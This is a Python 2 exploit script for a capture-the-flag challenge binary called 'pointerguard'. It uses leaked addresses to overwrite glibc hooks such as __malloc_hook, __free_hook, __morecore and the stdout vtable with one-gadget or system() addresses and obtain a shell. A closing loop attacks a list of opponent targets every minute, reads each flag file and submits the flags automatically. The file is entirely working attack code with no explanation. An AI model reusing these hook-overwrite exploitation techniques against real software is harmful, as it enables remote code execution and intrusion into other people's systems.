__author__ = "pxx"

from zio import *

is_local = True
#is_local = False

binary_path = "./pointerguard"

libc_file_path = ""
#libc_file_path = "./libc.so.6"

ip = ""
port = 0

if is_local:
	target = binary_path
else:
	target = (ip, port)

def d2v_x64(data):
	return l64(data[:8].ljust(8, '\x00'))

def d2v_x32(data):
	return l32(data[:4].ljust(4, '\x00'))

def rd_wr_str(io, info, buff):
	io.read_until(info)
	io.write(buff)

def rd_wr_int(io, info, val):
	rd_wr_str(io, info, str(val) + "\n")

import struct
def u2i(val):

	data = struct.pack("<Q", val)
	return struct.unpack("<q", data)[0]


def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")

	r_m = False
	w_m = False
	#io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	io = zio(target, timeout = 10, print_read = r_m, print_write = w_m, env={"LD_PRELOAD":libc_file_path})
	return io

binary_base = 0
libc_base = 0
stack_base = 0
p_rdi_ret = 0
system_addr = 0
binsh_addr = 0
magic_addr = 0

def init_data(io):
	global binary_base
	global libc_base
	global stack_base
	global p_rdi_ret
	global system_addr
	global binsh_addr
	global magic_addr

	offset_system = 0x45390
	offset_binsh = 0x18cd17

	p_rdi_ret = 0x0000000000401333
	p_rsi_r15_ret = 0x0000000000401331

	io.read_until("_base=")
	data = io.read_until("\n")[:-1]
	binary_base = int(data, 16)
	io.read_until("_base=")
	data = io.read_until("\n")[:-1]
	libc_base = int(data, 16)
	io.read_until("_base=")
	data = io.read_until("\n")[:-1]
	stack_base = int(data, 16)

	system_addr = libc_base + offset_system
	binsh_addr = libc_base + offset_binsh

	magic_addr = libc_base + 0x4526A

	#print u2i(0xffffffffffffffff)
	rd_wr_str(io, "somewhere?\n", "Yes! I want!\n")

def set_val(io, addr, val):
	rd_wr_int(io, "Addr:\n", u2i(addr))
	rd_wr_int(io, "Value:\n", u2i(val))

def set_val_list(io, data_list, full = True):

	if full == True:
		while len(data_list) < 10:
			data_list.append(data_list[-1])
	for item in data_list:
		#print hex(item[0]), hex(item[1])
		set_val(io, item[0], item[1])

def do_things(io, data, extern_data = ""):
	rd_wr_str(io, "before end\n", data)
	if "printf" in data or "malloc/free" in data:
		io.write(extern_data)

def pwn_malloc_hook(io, offset = 0):
	malloc_hook                 = 0x3C4B10
	pwn_libc_hook(io, malloc_hook, offset)

def pwn_realloc_hook(io, offset = 0):
	realloc_hook                 = 0x3C4B08
	pwn_libc_hook(io, realloc_hook, offset)

def pwn_free_hook(io, offset = 0):
	free_hook                 = 0x3C67A8
	pwn_libc_hook(io, free_hook, offset)

def pwn_morecore_hook(io, offset = 0):
	global magic_addr
	global libc_base

	morecore_hook                 = 0x3C53B0 + libc_base

	target_addr = 0x88E2A + libc_base
	magic_addr = 0x45216 + libc_base

	memalign_got                 = 0x3C4040 + libc_base

	#print "offset:", hex(memalign_got - libc_base)
	data_list = []
	data_list.append([morecore_hook, target_addr])
	data_list.append([memalign_got, magic_addr])
	set_val_list(io, data_list)

	#print hex(target_addr)
	#io.gdb_hint()
	do_things(io, "malloc/free\n", str(0x1fdc0) + "\n")

def pwn_after_morecore_hook(io, offset = 0):
	global magic_addr

	after_morecore_hook                 = 0x3C67A0
	magic_addr = 0xf0274 + libc_base #rsp+0x50
	#io.gdb_hint()
	pwn_libc_hook(io, after_morecore_hook, str(0x1fdc0) + "\n", offset)

def adjust(addr, val, offset, data = ""):
	addr_set = addr - offset
	val_set = l64((l64(val)[0:8-offset] + data).rjust(8, '\x00'))
	
	return addr_set, val_set


def pwn_libc_hook(io, hook_offset, data = "data\n", offset = 0):
	global magic_addr
	global libc_base
	hook_addr                 = hook_offset + libc_base
	#print "offset:", hex(hook_addr - libc_base)
	data_list = []

	#print hex(hook_addr), hex(magic_addr)
	#addr_set = hook_addr - offset
	#val_set = l64(l64(magic_addr)[0:8-offset].rjust(8, '\x00'))
	
	addr_set, val_set = adjust(hook_addr, magic_addr, offset)
	#print hex(addr_set), hex(val_set)
	data_list.append([addr_set, val_set])
	set_val_list(io, data_list)
	#io.gdb_hint()
	do_things(io, "malloc/free\n", data)

def pwn_dtor_addr(io):
	global magic_addr
	global libc_base
	global binsh_addr

	dtor_addr                 = 0x5cf700 - 0x40

	hook_offset = dtor_addr

	hook_addr                 = hook_offset + libc_base
	#print "offset:", hex(hook_addr - libc_base)
	data_list = []
	data_list.append([hook_addr, hook_addr + 0x8])
	data_list.append([hook_addr + 8, 0])
	data_list.append([hook_addr + 0x10, binsh_addr])
	data_list.append([hook_addr + 0x70, system_addr])
	set_val_list(io, data_list)
	#io.gdb_hint()
	do_things(io, "dd\n")

def pwn_stdout_addr(io):
	global libc_base
	global stack_base
	global system_addr

	stdout_addr = 0x3C5620 + libc_base
	fake_stdout_addr = stack_base - 0x1000
	magic_addr = 0xf0274 + libc_base #rsp+0x50

	#print "offset:", hex(stdout_addr - libc_base)
	data_list = []
	data_list.append([fake_stdout_addr + 0x38, magic_addr])
	data_list.append([stdout_addr + 0xd8, fake_stdout_addr])
	#data_list.append([stdout_addr, (0x8000|0x11111111) | l64("\x00\x00\x00\x00;sh;")])
	#io.gdb_hint()
	set_val_list(io, data_list, False)


def get_shell(io):
	#io.interact()
	#io.interact()
	io.writeline("cat flag/flag")
	data = io.read_until("\n", timeout = 2)[:-1]
	print "-"*0x30
	print data.strip()
	print "-"*0x30
	return data.strip()

def pwn(io, way = 0):

	#offset info
	if is_local:
		#local
		offset_system = 0x0
		offset_binsh = 0x0
	else:
		#remote	
		offset_system = 0x0
		offset_binsh = 0x0

	init_data(io)
	if way == 0:
		pwn_malloc_hook(io)
	elif way == 1:
		pwn_realloc_hook(io)
	elif way == 2:
		pwn_free_hook(io)
	elif way == 3:
		pwn_morecore_hook(io)
	elif way == 4:
		pwn_after_morecore_hook(io)
	elif way == 5:
		pwn_dtor_addr(io)
	elif way == 6:
		pwn_stdout_addr(io)
	return get_shell(io)


from libad import *
import time
while True:
	success_list = []
	for target in problem1_targets:
		print target
		for i in range(3, 7):
			try:
				io = get_io(target)
				flag = pwn(io, i)
				if flag != "" and len(flag) > 8:
					submit_flag(flag)
					success_list.append(target[0])
					break
			except Exception as e:
				pass
	print len(success_list)
	for ip in success_list:
		print ip
	time.sleep(60)